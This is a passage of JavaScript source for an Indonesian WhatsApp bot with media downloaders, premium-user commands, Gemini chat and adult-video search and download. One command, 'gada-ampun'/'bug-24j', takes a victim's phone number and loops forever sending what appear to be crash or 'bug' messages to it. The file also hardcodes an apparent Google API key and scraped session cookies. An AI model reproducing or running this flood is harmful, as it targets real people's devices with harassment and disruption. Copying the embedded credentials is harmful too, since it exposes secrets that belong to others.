        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    },
  });

  return await response.text();
}

let media = await ptz.downloadAndSaveMediaMessage(quoted);
let link = await catboxx(media);
  let caption = `📮 *L I N K :*
${link}
📊 *S I Z E :* ${formatBytes(media.length)}
📛 *E x p i r e d :* "No Expiry Date" 

`;

  await m.reply(caption);

break
case 'tourl3':{
let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  if (!mime) return m.reply("No media found");
  let media = await ptz.downloadAndSaveMediaMessage(quoted)
let link = await Catbox(media);
  let caption = `📮 *L I N K :*
${link}
📊 *S I Z E :* ${formatBytes(media.length)}

`;

  await m.reply(caption);
}
break
case 'setppfull': case 'setppbot2':{
if (!isCreator) return m.reply('Fitur Khusus owner!')
if (!quoted) return m.reply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Reply foto dgn caption ${prefix + command}`)
let media = await ptz.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await ptz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
m.reply("Sukses!")
}
        break
/**
 * 
 * [ *CASE UPAUDIO* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

case 'upaudio':{
if (!isCreator) return m.reply(mess.owner)
if (!/audio/.test(mime)) return m.reply(`khusus audio, .upaudio jidsaluran|request dari|judul lagu`)
    yaelahh = text.split("|")[0]
    ngawi = text.split("|")[1]
    bjirrwoila = text.split("|")[2]
 ptz.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
 await sleep(6000)
ptz.sendMessage(yaelahh, { 
  audio: await quoted.download(), 
viewOnce: false, 
seconds: "900000000", ptt: true, 
mimetype: "audio/mpeg", 
fileName: "bot.mp3", 
waveform: [0, 153, 0, 494, 976], 
contextInfo: {
forwardingScore: 999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: { 
newsletterName: `${ownername}`, 
newsletterJid: idch
}, 
externalAdReply: { 
showAdAttribution: true, 
mediaType: 2, 
mediaUrl: `http://wa.me/6283824196477/${Math.floor(Math.random() * 100000000000000000)}`, 
title: `[🎶] - ${bjirrwoila}`, 
body: `Request by ${ngawi}`, 
sourceUrl: "", 
thumbnail: fkethmb 
}
}
})
await sleep(2000)
ptz.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break
case 'fbdl': case 'fb2': {
  if (!args[0]) {
    throw `Masukkan URL!\n\nContoh:\n${prefix}${command} https://www.facebook.com/share/r/ZM2xDeQdQ5y31jR5/?mibextid=D5vuiz`;
  }
  try {
    if (!args[0].match(/facebook/gi)) {
      throw `Berikan URL dari Facebook!`;
    }
    reply('Tunggu sebentar...'); 
    const response = await fg.fbdl(args[0]);
    const { videoUrl, size, title } = response;
    let vid = videoUrl;
    let caption = `⬣───「 *FACEBOOK* 」───⬣
○ Title: ${title}
○ Size: ${size}
○ VideoUrl: ${readMore}
${videoUrl}`;
    await ptz.sendFile(m.chat, vid, 'facebook.mp4', caption, m);
  } catch (e) {
    throw '*Tidak Dapat Mengambil Informasi Url*';
  }
};
break
case 'autoai':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#nanochat', m.sender, _cmd)
if (isnanochat) return reply(`Udah aktif`)
chatnano.push(m.chat)
fs.writeFileSync('./chatnano.json', JSON.stringify(chatnano, null, 2))
reply('_Successfully Activate Nano Chat_')
} else if (args[0] === "off") {
addCountCmd('#nanochat', m.sender, _cmd)
if (!isnanochat) return reply(`Udah nonaktif`)
let anu = chatnano.indexOf(m.chat)
chatnano.splice(anu, 1)
fs.writeFileSync('./chatnano.json', JSON.stringify(chatnano, null, 2))
reply('_Successfully Disabling Nano Chat_')
} else {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './Thum.jpg' } }, { upload: ptz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363310531380313@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
}
  
}
break
case 'blacklist': {
    if (!isCreator) return reply(mess.owner);
    if (!m.quoted || !m.quoted.sender) return reply("Tag pengguna yang ingin di-blacklist.");

    let userId = m.quoted.sender;
    blacklist[userId] = true;
    reply(`Pengguna ${userId} telah ditambahkan ke blacklist.`);
}
break
/*
 - *[ MEDIAFIRE - DOWNLOAD ]*
 - https://whatsapp.com/channel/0029Vae6iYe30LKGkbTvBC3E
*/

/*const axios = require('axios')

// Function Nya
exports.fetchJson = async (url, options) => {
  try {
    options ? options : {}
    const res = await axios({
      method: 'GET',
      url: url,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
      },
      ...options
    })
    return res.data
  } catch (err) {
    return err
  }
}*/

// Case Nya
case 'mf':
case 'mediafire': {
if (!text) return reply(`Contoh : ${prefix + command} linknya`)
reply('Sabar Pantek')
await fetchJson(`https://widipe.com/mediafire?link=${text}`).then(async (res) => {
ptz.sendMessage(m.chat, { document: { url: res.result.url }, fileName: res.result.filename, mimetype: res.result.filetype, caption: 'Done Pantek' }, { quoted: m })
}).catch(err => reply('Error :v🗿'))
}
break
/*Case Tele Xnxxsearch && XnxxDl/*
Sumber : 
https://whatsapp.com/channel/0029VaD82kP7j6g6RZTdb12h*/

case 'xnxxsearch': {
			if (!text) return reply(`Kirim Judul Bokep`)
			try {
				const fg = require('api-dylux')
				let res = await fg.xnxxSearch(text)
				reply(mess.wait)
				let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n')
				if (res.status) reply(ff)
				
			} catch (error) {
				console.error(error);
				reply('Yah Error');
			}
		}
		break
case 'xnxxdl': {
			if (!text) return reply(`Kirim Link Bokep di situs XNXX`)
			if (!text.includes('xnxx.com')) return kreply(`Kirim Link Bokep di situs XNXX`)
			try {
			reply(mess.wait)
				const fg = require('api-dylux')
				let xn = await fg.xnxxdl(text)
				let tobatrek = `*XNXX DOWNLOAD*
        
▢ *📌Title*: ${xn.title}
▢ *⌚Duration:* ${xn.duration}
▢ *🎞️Quality:* ${xn.quality}`
await /*ptz.replyWithVideo({
            url: xn.url_dl,
            },{
            caption: tobatrek,
        })*/
ptz.sendMessage(m.chat, { video: { url: xn.url_dl}, caption: `Auto Download ✅`}, {quoted: m})
			} catch (error) {
				console.error(error);
				reply('Yah Error');
			}
		}
		break
case 'runtime': 
var yap = `
*───「 RUNTIME BOT 」───*

Runtime : ${runtime(process.uptime())}
`
reply(yap)
break
/*case 'addprem':
if (!isPrem) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6285730672259`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ptz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./lib/premium.json', JSON.stringify(prem))
reply(`The Number ${prrkek} Has Been Premium!`)
break
//=================================================//

 case 'delprem':
if (!isPrem) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./lib/premium.json', JSON.stringify(prem))
reply(`The Number ${ya} Has Been Removed Premium!`)
break
//=================================================//

        case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let ptz of prem) {
teks += `- ${ptz}\n`
}
teks += `\n*Total : ${prem.length}*`
ptz.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m , contextInfo: { "mentionedJid": prem } })
break*/
case 'addprem': {
   let { MessageType } = require('@whiskeysockets/baileys');
function no(number) {
    return number.replace(/\s/g, '').replace(/([@+-])/g, '');
  }

  var hl = [];
  hl[0] = text.split('|')[0];
  hl[0] = no(hl[0]) + "@s.whatsapp.net";
  hl[1] = text.split('|')[1];
    
	ptz.sendMessage(m.chat, {
		react: {
			text: '🐧',
			key: m.key,
		}
	})

if (!isPrem) return reply(mess.owner)
  if (!text) return m.reply(`*Example*: .addprem @tag | 100`);
  if (typeof db.data.users[hl[0]] == 'undefined') return m.reply('User No Database.');

  var jumlahHari = 86400000 * hl[1];
  var now = new Date() * 1;

  global.db.data.users[hl[0]].premium = true;

  if (now < global.db.data.users[hl[0]].premiumDate) global.db.data.users[hl[0]].premiumDate += jumlahHari;
  else global.db.data.users[hl[0]].premiumDate = now + jumlahHari;

  let username = `@${hl[0].split('@')[0]}`;
 	let days = Math.abs(Math.floor((global.db.data.users[hl[0]].premiumDate - new Date()) / (24 * 60 * 60 * 1000)));
			let hours = Math.abs(Math.floor((global.db.data.users[hl[0]].premiumDate - new Date()) / (60 * 60 * 1000))) % 24;
			let minutes = Math.abs(Math.floor((global.db.data.users[hl[0]].premiumDate - new Date()) / (60 * 1000))) % 60;

ptz.sendMessage(m.chat, {
		react: {
			text: '🦖',
			key: m.key,
		}
	})
  ptz.sendMessage(hl[0], { text: `Kamu Sekarang Premium!!, Jangka Waktu ${days} Hari ${hours} Jam ${minutes} Menit `, mentions: [hl[0]] }, { quoted: m })
  let rs = `sukses ${username} Sudah Premium, Masa Waktu/Jangka Waktu Sudah Terkirim Ke Private Chat ${username}`
  ptz.sendMessage(m.chat, { text: rs, mentions: [hl[0]] }, { quoted: m })
}
        break
        
        case 'delprem': {

function no(number){
    return number.replace(/\s/g,'').replace(/([@+-])/g,'')
  }
  if (!isPrem) return reply(mess.owner)
  if (!text) {
    reply(`*Example*: .delprem @mention/tag`)
    return
  }

  let mentionedJid = m.mentionedJid[0]
  if (!mentionedJid) {
    let annjay = no(text) + "@s.whatsapp.net"
    if (!global.db.data.users[annjay]) {
      reply('User Tidak Ditemukan')
      return
    }
    mentionedJid = annjay
  }

  let user = global.db.data.users[mentionedJid]
  if (!user) {
    reply('User Tidak Ditemukan.')
    return
  }
  
  if (!user.premium) {
    reply('User Tidak Premium!')
    return
  }

  user.premium = false
  user.premiumDate = 0
  let message = `@${mentionedJid.split('@')[0]} Sudah Tidak Premium.`
  ptz.sendMessage(m.chat, { text: message, mentions: [mentionedJid] }, { quoted: m })
}
        break

        case 'listprem': {
let response = "⚝ *L I S T  P R E M I U M:*\n\n";
	let totalPremium = 0;

	for (let user in global.db.data.users) {
		if (global.db.data.users[user].premium) {
			let number = user.split("@")[0];
			
			let days = Math.abs(Math.floor((global.db.data.users[user].premiumDate - new Date()) / (24 * 60 * 60 * 1000)));
			let hours = Math.abs(Math.floor((global.db.data.users[user].premiumDate - new Date()) / (60 * 60 * 1000))) % 24;
			let minutes = Math.abs(Math.floor((global.db.data.users[user].premiumDate - new Date()) / (60 * 1000))) % 60;

			response += `╭ @${number}\n╰ Expired: ${days} Hari ${hours} Jam ${minutes} Menit\n\n`;

			totalPremium++;
		}
	}

	response += `♻️Total Premium : *${totalPremium}*`;

ptz.sendMessage(m.chat, { text: response, mentions: Object.keys(global.db.data.users).filter(jid => global.db.data.users[jid].premium) }, { quoted: m })
}

        break
case 'gada-ampun': case 'bug-24j': {
    
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
    const zyr = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}
let bijipler = text.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (;;) {
await ngeloc(target, zyr)
await baklis(target, zyr)
await ngeloc(target, zyr)
await ngeloc(target, zyr)
await baklis(target, zyr)
await ngeloc(target, zyr)
await ngeloc(target, zyr)
await baklis(target, zyr)
await ngeloc(target, zyr)
await ngeloc(target, zyr)
await baklis(target, zyr)
await ngeloc(target, zyr)
await sleep(30000)
}
}
break
/*
* 
* [ *CASE GEMINI ALL IN ONE* ]
* https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
**/

case 'gemini2': {
//created by hann dont hapus wm
  let hann1 = args[0]
  let hann2 = text
  const { GoogleGenerativeAI, HarmBlockThreshold, HarmCategory } = require("@google/generative-ai");
//created by hann dont hapus wm
const { GoogleAIFileManager } = require("@google/generative-ai/server");
const path = require("path");
  const Used_Apikey = "AIzaSyB2mvsGVTZAU-h-GtCLzoLhjHEdvugx9uQ"
  const genAI = new GoogleGenerativeAI(Used_Apikey);
  const fileManager = new GoogleAIFileManager(Used_Apikey);
  switch (hann1) {
    case 'chat':
//created by hann dont hapus wm
const safetySettings = [
  {
    category: HarmCategory.HARM_CATEGORY_HARASSMENT,
    threshold: HarmBlockThreshold.BLOCK_LOW_AND_ABOVE,
  },
  {
    category: HarmCategory.HARM_CATEGORY_HATE_SPEECH,
    threshold: HarmBlockThreshold.BLOCK_LOW_AND_ABOVE,
  },
];

const modello = genAI.getGenerativeModel({ model: "gemini-1.5-flash", safetySettings: safetySettings });
const prompttt = hann2;
const resultt = await modello.generateContent(prompttt);
const responsek = await resultt.response;
const textt = responsek.text();
m.reply(textt);
break;
//created by hann dont hapus wm
case 'chatprompt':
const modell = genAI.getGenerativeModel({
  model: "gemini-1.5-flash",
  systemInstruction: "Nama Kamu Adalah Ryoo, Sifat Kamu Adalah Baik, Imut, dan Tenang dalam dirinya. Kamu Dibuat oleh Hann Jika ada yang ditanyakan sama Hann kamu marah",
});
const promptt = hann2;
const resultp = await modell.generateContent(promptt);
const responseqo = await resultp.response;
const textl = responseqo.text();
m.reply(textl);
  break;
  case 'audio':
                        if (!hann2) return m.reply('Mana audio sama perintahnya?')
                        const modelll = genAI.getGenerativeModel({
                            model: "gemini-1.5-flash",
                        });
                        const fileBuffer = await m.quoted.download()
                        const base64AudioFile = fileBuffer.toString("base64"); // Convert file content to Base64
                        const tempFilePathAud = path.join(__dirname, `temp_audio_${Date.now()}.mp3`);
                        fs.writeFileSync(tempFilePathAud, fileBuffer);
                        if (/audio/.test(mime)) {
                            const audioFile = await fileManager.uploadFile(tempFilePathAud, {
                                mimeType: "audio/mp3",
                            });
                            console.log(`Uploaded file ${audioFile.file.uri}`);
   fs.unlinkSync(tempFilePathAud);
                            const result = await modelll.generateContent([
                                {
                                    inlineData: {
                                        mimeType: "audio/mp3",
                                        data: base64AudioFile
                                    }
                                },
                                { text: hann2 },
                            ]);                        
                            m.reply(result.response.text())
                        } else reply(`Reply/kirim audionya!`)
                    break
//created by hann dont hapus wm
    case 'image':
                        const modepl = genAI.getGenerativeModel({
                            model: "gemini-1.5-pro",
                        });
                        const fileBufferr = await m.quoted.download()
                        const tempFilePath = path.join(__dirname, `temp_image_${Date.now()}.jpg`);
                        fs.writeFileSync(tempFilePath, fileBufferr);
                        if (/image/.test(mime)) {
                            const uploadResponse = await fileManager.uploadFile(tempFilePath, {
                                mimeType: "image/jpeg",
                                displayName: `temp_image_${Date.now()}`,
                            });
                            // Delete the temporary file after upload
                            fs.unlinkSync(tempFilePath);
                            console.log(`Uploaded file ${uploadResponse.file.displayName} as: ${uploadResponse.file.uri}`);
                            const result = await modepl.generateContent([
                                {
                                    fileData: {
                                        mimeType: uploadResponse.file.mimeType,
                                        fileUri: uploadResponse.file.uri
                                    }
                                },
                                { text: 'gunakan bahasa indonesia' + hann2 },
                            ]);
                            m.reply(result.response.text())
                        } else m.reply(`Reply to the image`)
                    break;
//created by hann dont hapus wm
                    case 'video':
                     const modelk = genAI.getGenerativeModel({
                            model: "gemini-1.5-pro",
                        }); 
const fileBufferrp = await m.quoted.download()
                        const tempFilePathp = path.join(__dirname, `temp_video_${Date.now()}.mp4`);
                        fs.writeFileSync(tempFilePathp, fileBufferrp);
if (/video/.test(mime)) {
                            const uploadResponseee = await fileManager.uploadFile(tempFilePathp, {
                                mimeType: "video/mp4",
                                displayName: `temp_video_${Date.now()}`,
                            });
                            fs.unlinkSync(tempFilePathp);
                            console.log(`Uploaded file ${uploadResponseee.file.displayName} as: ${uploadResponseee.file.uri}`);
                            const hasilnya = await modelk.generateContent([
                                {
                                    fileData: {
                                        mimeType: uploadResponseee.file.mimeType,
                                        fileUri: uploadResponseee.file.uri
                                    }
                                },
                                { text: 'gunakan bahasa indonesia' + hann2 },
                            ]);
                            m.reply(hasilnya.response.text())
                        } else m.reply(`Reply to the video`)
                        break;
//created by hann dont hapus wm
      case 'help':
        m.reply(`
.gemini2 help - untuk melihat command
.gemini2 chatprompt - chat dengan gemini menggunakan prompt dari ryoo
.gemini2 chat - mengobrol sama gemini menggunakan keamanan
.gemini2 image - chat menggunakan foto dengan gemini
.gemini2 audio - chat menggunakan audio dengan gemini
.gemini2 video - chat menggunakan video dengan gemini
        `)
        break;
default:
ptz.sendMessage(m.chat, { text: "Maaf kak, jika ada bantuan nya ketik .gemini2 help" });
}
}
break
//==========≠============//

case 'gdrive': { 
if (!text) return reply(`Example ${prefix + command} url`)
async function GDriveDl(url) {
	let id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))?.[1]
	if (!id) return reply('ID Not Found')
	let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
		method: 'post',
		headers: {
			'accept-encoding': 'gzip, deflate, br',
			'content-length': 0,
			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
			'origin': 'https://drive.google.com',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
			'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
			'x-drive-first-party': 'DriveWebUi',
			'x-json-requested': 'true' 
		}
	})
	let { fileName, sizeBytes, downloadUrl } = JSON.parse((await res.text()).slice(4))
	if (!downloadUrl) return reply('Link Download Limit!')
	let data = await fetch(downloadUrl)
	if (data.status !== 200) throw data.statusText
	return {
		downloadUrl, fileName,
		fileSize: (sizeBytes / 1024 / 1024).toFixed(2),
		mimetype: data.headers.get('content-type')
	}
}
try {
 let kanjuttgede = await GDriveDl(text)
 let bjirrbang = `*Google Drive*\n\nNama: ${kanjuttgede.fileName}\nLink: ${kanjuttgede.downloadUrl}`
 reply(bjirrbang)
 await ptz.sendMessage(m.chat, { document: { url: kanjuttgede.downloadUrl }, fileName: kanjuttgede.fileName, mimetype: kanjuttgede.mimetype }, { quoted: m })
} catch (error) {
 m.reply(`${error.message}`)
}
}
break

case 'everyone': {
if (!isPrem) return
let mem = m.isGroup ? await groupMetadata.participants.map(a => a.id) : ""
ptz.sendMessage(m.chat, {
	text: `@${m.chat} ${text}`,
	contextInfo: {
mentionedJid: mem, 
		groupMentions: [
			{
				groupSubject: `everyone - [ *${global.botname}* ] ||`,
				groupJid: m.chat,
			},
		],
	},
});
}
break

case 'igdl2': {
 if (!text) return reply("Example: .igdl ig reels\n\nonly reels")
async function igdl(url) {
 return new Promise(async (resolve, reject) => {
 const payload = new URLSearchParams(
 Object.entries({
 url: url,
 host: "instagram"
 })
 )
 await axios.request({
 method: "POST",
 baseURL: "https://saveinsta.io/core/ajax.php",
 data: payload,
 headers: {
 "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
 cookie: "PHPSESSID=rmer1p00mtkqv64ai0pa429d4o",
 "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
 }
 })
 .then(( response ) => { 
 const $ = cheerio.load(response.data)
 const mediaURL = $("div.row > div.col-md-12 > div.row.story-container.mt-4.pb-4.border-bottom").map((_, el) => {
 return "https://saveinsta.io/" + $(el).find("div.col-md-8.mx-auto > a").attr("href")
 }).get()
 const res = {
 status: 200,
 media: mediaURL
 }
 resolve(res)
 })
 .catch((e) => {
 console.log(e)
 throw {
 status: 400,
 message: "error",
 }
 })
 })
}
let kanjutgedeu = await igdl(text)
ptz.sendMessage(m.chat, {video: {url: kanjutgedeu.media}, caption: mess.success}, {quoted: m})
}
break

case 'morphic': {
 if (!text) return reply(`Example: ${prefix + command} hai`)
async function morphic(query) {
 const url = 'https://www.morphic.sh/';
 const formData = new FormData();
 
 formData.append('1', JSON.stringify({ id: '6399a7e212fa477d1a783edade27c8354a64e1ab', bound: null }));
 formData.append('2', JSON.stringify({ id: '9eed8f3e1c51044505fd5c0d73e8d2a92572691c', bound: null }));
 formData.append('3_input', query);
 formData.append('3_include_images', 'true');
 formData.append('0', JSON.stringify([{"action":"$F1","options":{"onSetAIState":"$F2"}},{"chatId":"9TI931x","messages":[]},"$K3",false,"$undefined","$undefined"]));

 try {
 const response = await fetch(url, {
 method: 'POST',
 headers: {
 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
 Accept: 'text/x-component',
 'Accept-Language': 'en-US,en;q=0.5',
 'Accept-Encoding': 'gzip, deflate, br, zstd',
 Referer: 'https://www.morphic.sh/',
 'Next-Action': 'c54d85c7f9588581807befbe1a35958acc57885b',
 'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2F%22%2C%22refresh%22%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
 Origin: 'https://www.morphic.sh',
 Connection: 'close',
 Cookie: 'ph_phc_HK6KqP8mdSmxDjoZtHYi3MW8Kx5mHmlYpmgmZnGuaV5_posthog=%7B%22distinct_id%22%3A%220191839d-890a-7a97-b388-bc7191ac7047%22%2C%22%24sesid%22%3A%5B1724490025781%2C%220191839d-8909-72e8-b586-d66ff3bde34f%22%2C1724490025225%5D%7D',
 Priority: 'u=0',
 TE: 'trailers',
 },
 body: formData
 });

 const data = await response.text();

 const regex = /"diff":\[0,"([^"]+)"\]/g;
 let result;
 let finalText = "";

 while ((result = regex.exec(data)) !== null) {
 finalText += result[1];
 }

 return finalText;
 } catch (error) {
 console.error('Error:', error);
 throw error;
 }
}
try {
 let hannpler = await morphic(text)
 ptz.sendMessage(m.chat, {text: hannpler}, {quoted: m})
} catch (error) {
 m.reply("Error bang")
}
}
break

case 'akira': case 'akiyama': case 'anachan': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo': case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kagachan': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming': case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'spacee': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPrem) return reply(mess.premium)
reply(mess.search)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/anachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
